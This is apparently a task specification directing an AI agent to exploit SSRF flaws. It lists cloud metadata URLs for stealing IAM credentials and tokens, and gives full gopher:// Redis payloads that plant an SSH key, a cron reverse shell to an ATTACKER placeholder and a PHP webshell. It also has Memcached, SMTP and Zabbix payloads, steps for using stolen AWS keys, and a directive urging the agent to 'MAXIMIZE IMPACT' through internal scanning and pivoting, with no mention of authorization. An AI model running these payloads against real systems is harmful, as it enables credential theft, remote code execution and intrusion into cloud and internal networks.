================================================================================
TASK 51 â€” SSRF EXPLOITATION & CLOUD METADATA
================================================================================
Covers testing_toolkit.txt Phase 5 Step 15 + Phase 13 Step 43
Requires: Task 50 outputs (confirmed SSRF endpoints)

OBJECTIVE
â”€â”€â”€â”€â”€â”€â”€â”€â”€
Exploit confirmed SSRF vulnerabilities to:
- Extract cloud credentials (AWS/GCP/Azure IAM)
- Access internal services (Redis, Memcached, Elasticsearch, etc.)
- Perform protocol smuggling (gopher://)
- Achieve RCE via internal service exploitation

================================================================================
                              INPUT FILES
================================================================================
PRIMARY (from Task 50):
  outputs/ssrf/task51_targets.json            â† confirmed SSRF endpoints
  outputs/ssrf/protocol_support.json          â† supported protocols
  outputs/ssrf/ssrf_vulnerable.json           â† all confirmed SSRFs

INTELLIGENCE:
  outputs/nuclei/tech_stack.json              â† tech stack (Redis? Elastic?)
  outputs/waf_summary.json                    â† bypass techniques

================================================================================
                             OUTPUT FILES
================================================================================
outputs/ssrf/
â”œâ”€â”€ cloud_credentials.json        â† extracted IAM credentials (CRITICAL)
â”œâ”€â”€ internal_services.json        â† discovered internal services
â”œâ”€â”€ exploitation_results.json     â† successful exploitation attempts
â”œâ”€â”€ gopher_payloads_used.txt      â† successful gopher payloads
â”œâ”€â”€ scan_log.txt                  â† execution log
â””â”€â”€ vulnerabilities/
    â””â”€â”€ SSRF-XXXX-CRITICAL.md     â† individual vuln reports

================================================================================
                    CLOUD METADATA EXPLOITATION
================================================================================

SECTION 1: AWS IMDS EXPLOITATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Step 1: Check if metadata accessible
http://169.254.169.254/latest/meta-data/

# Step 2: Get instance info
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# Step 3: Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 4: Get credentials (CRITICAL)
http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}
# Returns: AccessKeyId, SecretAccessKey, Token

# Step 5: Get user-data (may contain secrets)
http://169.254.169.254/latest/user-data

# Step 6: Get instance identity document
http://169.254.169.254/latest/dynamic/instance-identity/document

# IPv6 variant
http://[fd00:ec2::254]/latest/meta-data/

SECTION 2: GCP METADATA EXPLOITATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Requires header: Metadata-Flavor: Google
# Some SSRFs allow header injection

# Get project info
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# Get instance info
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/name
http://metadata.google.internal/computeMetadata/v1/instance/hostname

# Get access token (CRITICAL)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Get service account email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Get all scopes
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

# Get SSH keys
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

SECTION 3: AZURE METADATA EXPLOITATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Requires header: Metadata: true

# Get instance info
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Get access token (CRITICAL)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Get subscription info
http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01

SECTION 4: OTHER CLOUD PROVIDERS
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/auth-token

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/identity/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# Kubernetes
http://kubernetes.default.svc/
https://kubernetes.default.svc/api/v1/namespaces/default/secrets

================================================================================
                    INTERNAL SERVICE EXPLOITATION
================================================================================

SECTION 5: REDIS EXPLOITATION (via gopher://)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Generate with Gopherus:
gopherus --exploit redis

# Manual payload: Write SSH key
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0Assh-rsa%20AAAA...%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/root/.ssh/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# Manual payload: Write cron job
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/ATTACKER/PORT%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# Manual payload: Write webshell
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

SECTION 6: MEMCACHED EXPLOITATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Info leak
gopher://127.0.0.1:11211/_stats%0d%0a
gopher://127.0.0.1:11211/_stats%20items%0d%0a
gopher://127.0.0.1:11211/_stats%20slabs%0d%0a

# Get cached data
gopher://127.0.0.1:11211/_get%20session:admin%0d%0a

# Set malicious data (if deserialization vuln exists)
gopher://127.0.0.1:11211/_set%20session:admin%200%20900%2050%0d%0a<SERIALIZED_PAYLOAD>%0d%0a

SECTION 7: MYSQL EXPLOITATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Generate with Gopherus:
gopherus --exploit mysql

# Load file (if FILE privilege)
gopher://127.0.0.1:3306/_<mysql_load_file_packet>

# Execute query
gopher://127.0.0.1:3306/_<mysql_query_packet>

SECTION 8: POSTGRESQL EXPLOITATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Generate with Gopherus:
gopherus --exploit postgresql

# Execute command (if superuser)
gopher://127.0.0.1:5432/_<postgresql_copy_packet>

SECTION 9: FASTCGI/PHP-FPM EXPLOITATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Generate with Gopherus:
gopherus --exploit fastcgi

# Execute PHP code
gopher://127.0.0.1:9000/_<fastcgi_packet>

# Default paths to target:
/var/www/html/index.php
/usr/share/php/index.php

SECTION 10: SMTP EXPLOITATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Send email (for phishing, internal)
gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40target.com%3E%0d%0aDATA%0d%0aSubject%3A%20Test%0d%0a%0d%0aMessage%0d%0a.%0d%0aQUIT%0d%0a

SECTION 11: ZABBIX EXPLOITATION
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Generate with Gopherus:
gopherus --exploit zabbix

# Execute command on agent
gopher://127.0.0.1:10050/_system.run[id]

================================================================================
                         TOOL COMMANDS
================================================================================

Gopherus (payload generator):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Redis RCE
python gopherus.py --exploit redis
# Choose: ReverseShell / PHPShell / SSHKey / Cron

# MySQL
python gopherus.py --exploit mysql
# Enter: username, query

# PostgreSQL
python gopherus.py --exploit postgresql
# Enter: username, command

# FastCGI
python gopherus.py --exploit fastcgi
# Enter: path to PHP file

# Zabbix
python gopherus.py --exploit zabbix
# Enter: command

AWS CLI (verify stolen credentials):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Configure with stolen creds
export AWS_ACCESS_KEY_ID=<stolen_key>
export AWS_SECRET_ACCESS_KEY=<stolen_secret>
export AWS_SESSION_TOKEN=<stolen_token>

# Test access
aws sts get-caller-identity
aws s3 ls
aws iam list-users
aws ec2 describe-instances

================================================================================
                         EXECUTION WORKFLOW
================================================================================

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 1: Load Confirmed SSRFs from Task 50                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Load task51_targets.json                                                  â”‚
â”‚ â€¢ Load protocol_support.json                                                â”‚
â”‚ â€¢ Prioritize by protocol support (gopher:// = highest)                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 2: Cloud Metadata Extraction                                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FOR each SSRF endpoint:                                                     â”‚
â”‚   a) Test AWS metadata endpoints                                            â”‚
â”‚   b) Test GCP metadata endpoints                                            â”‚
â”‚   c) Test Azure metadata endpoints                                          â”‚
â”‚   d) Extract IAM credentials if accessible                                  â”‚
â”‚   e) Verify credentials work (aws sts get-caller-identity)                  â”‚
â”‚   f) SEVERITY: CRITICAL if credentials obtained                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 3: Internal Network Scanning                                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Use SSRF to scan internal network:                                          â”‚
â”‚   a) Common internal IPs (10.0.0.1, 192.168.1.1)                            â”‚
â”‚   b) Common ports (22, 80, 443, 3306, 5432, 6379, 9200)                     â”‚
â”‚   c) Record accessible services                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 4: Protocol Smuggling (if gopher:// supported)                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FOR SSRFs with gopher:// support:                                           â”‚
â”‚   a) Check for Redis (port 6379) â†’ attempt RCE                              â”‚
â”‚   b) Check for Memcached (port 11211) â†’ data extraction                     â”‚
â”‚   c) Check for MySQL (port 3306) â†’ query execution                          â”‚
â”‚   d) Check for FastCGI (port 9000) â†’ PHP code execution                     â”‚
â”‚   e) Generate payloads with Gopherus                                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 5: Output & Report                                                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Write cloud_credentials.json (CRITICAL findings)                          â”‚
â”‚ â€¢ Write internal_services.json                                              â”‚
â”‚ â€¢ Write exploitation_results.json                                           â”‚
â”‚ â€¢ Generate vulnerability reports                                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

================================================================================
                     AI AGENT CREATIVITY DIRECTIVE
================================================================================
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Exploitation is about THINKING DEEPER than the payloads above.              â”‚
â”‚ You have confirmed SSRF. Now MAXIMIZE IMPACT through creative pivoting.     â”‚
â”‚                                                                             â”‚
â”‚ EXPLOITATION MINDSET:                                                       â”‚
â”‚                                                                             â”‚
â”‚ 1. MAP THE INTERNAL NETWORK                                                 â”‚
â”‚    Don't just try 127.0.0.1 - scan internal ranges systematically:          â”‚
â”‚    - 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16                              â”‚
â”‚    - Use response time differences to detect live hosts                     â”‚
â”‚    - Use response size differences to identify services                     â”‚
â”‚                                                                             â”‚
â”‚ 2. IDENTIFY THE ENVIRONMENT                                                 â”‚
â”‚    - AWS? Try 169.254.169.254 for IMDS                                      â”‚
â”‚    - GCP? Try metadata.google.internal (needs header)                       â”‚
â”‚    - Kubernetes? Try kubernetes.default.svc for service account             â”‚
â”‚    - Docker? Try 172.17.0.1:2375 for Docker API                             â”‚
â”‚                                                                             â”‚
â”‚ 3. CHAIN TO MAXIMUM IMPACT                                                  â”‚
â”‚    - Cloud creds â†’ enumerate S3/storage â†’ find secrets                      â”‚
â”‚    - Redis â†’ write SSH key â†’ server access                                  â”‚
â”‚    - Redis â†’ write webshell â†’ RCE                                           â”‚
â”‚    - Internal DB â†’ dump via error-based injection                           â”‚
â”‚                                                                             â”‚
â”‚ 4. THINK ABOUT WHAT'S NOT DOCUMENTED                                        â”‚
â”‚    - Internal APIs without auth (admin panels, debug endpoints)             â”‚
â”‚    - Microservices communicating via internal network                       â”‚
â”‚    - CI/CD systems (Jenkins 8080, GitLab, etc.)                             â”‚
â”‚    - Monitoring systems (Prometheus, Grafana, Zabbix)                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ADAPTIVE EXPLOITATION STRATEGY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Your approach should EVOLVE based on findings:

1. CLOUD METADATA FIRST (highest value)
   - Try all cloud providers, don't assume
   - If header required (GCP/Azure), check if SSRF allows header injection
   - If IMDSv2 (AWS), check for hop limit bypass or token leak

2. IF METADATA FAILS, SERVICE DISCOVERY
   - Port scan common services: 6379, 11211, 9200, 3306, 5432
   - Identify services from banners/errors
   - Each service = potential exploitation vector

3. IF SERVICE FOUND, PROTOCOL SMUGGLING
   - gopher:// is king - if supported, craft custom packets
   - dict:// for quick service identification
   - file:// for local file read (config files, keys)

4. IF STANDARD PORTS FAIL, THINK LATERALLY
   - Non-standard ports (8080, 8443, 9090, etc.)
   - Container IPs (172.17.0.x for Docker)
   - Kubernetes internal DNS (service.namespace.svc.cluster.local)

GOPHERUS CREATIVITY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Gopherus generates payloads, but you can THINK BEYOND:

â€¢ Redis: Not just SSH keys - try:
  - Write cron job for reverse shell
  - Write to web-accessible directory
  - Overwrite configuration files

â€¢ FastCGI: Not just PHP - try:
  - Environment variable injection
  - Path manipulation
  - Extension bypass

â€¢ MySQL: Think about:
  - LOAD DATA LOCAL INFILE for file read
  - SELECT INTO OUTFILE for file write
  - UDF for command execution

VERIFY YOUR EXPLOITATION:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Before reporting credentials/access:

â€¢ AWS creds: Run `aws sts get-caller-identity` to verify
â€¢ GCP token: Check token scopes and permissions
â€¢ Azure token: Verify resource access
â€¢ SSH key: Confirm write was successful (may need LFI to verify)
â€¢ Webshell: Actually execute a command to confirm

INTERNAL SERVICE PORT REFERENCE:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
22    - SSH
25    - SMTP
80    - HTTP
443   - HTTPS
3306  - MySQL
5432  - PostgreSQL
6379  - Redis
9000  - FastCGI/PHP-FPM
9200  - Elasticsearch
11211 - Memcached
27017 - MongoDB
2375  - Docker API (unauth)
10050 - Zabbix Agent
8500  - Consul
8080  - Jenkins/Tomcat
4444  - Metasploit
1433  - MSSQL

================================================================================
                              SEVERITY RATINGS
================================================================================
CRITICAL:
- Cloud credentials extracted (IAM role creds)
- RCE achieved via internal service (Redis, FastCGI)
- Database access via SSRF

HIGH:
- Internal network scanning possible
- Sensitive data from internal services
- File read via file:// protocol

MEDIUM:
- Internal service banner/version info
- Non-sensitive internal data

================================================================================
                                  NOTES
================================================================================
- AWS IMDSv2 requires headers â†’ harder to exploit via basic SSRF
- GCP requires Metadata-Flavor: Google header
- Azure requires Metadata: true header
- gopher:// is the "god protocol" - if supported, try everything
- Redis is often the easiest path to RCE
- Docker API on 2375 = instant root
- Always verify stolen credentials before reporting
================================================================================
